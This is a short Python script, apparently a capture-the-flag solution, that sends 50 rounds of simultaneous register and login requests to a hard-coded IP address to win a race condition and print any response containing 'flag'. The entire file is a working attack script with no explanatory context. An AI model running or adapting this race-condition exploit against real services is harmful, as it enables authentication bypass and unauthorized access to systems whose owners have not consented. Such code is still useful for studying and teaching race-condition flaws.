# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import requests
import threading


def register(data):
    re1 = requests.post(url='http://139.196.164.190/register.php', data=data)
    print re1.content


def login(data):
    re2 = requests.post(url='http://139.196.164.190/login.php', data=data)
    print re2.content
    if 'flag' in re2.content:
        print 'success!!!'


def main():
    for i in range(50):
        username = 'hackeee' + str(i)
        password = '123'
        data = {'username': username, 'password': password}
        t1 = threading.Thread(target=register, args=(data,))
        t2 = threading.Thread(target=login, args=(data,))
        t1.start()
        t2.start()

        t1.join()
        t2.join()

if __name__ == '__main__':
    main()

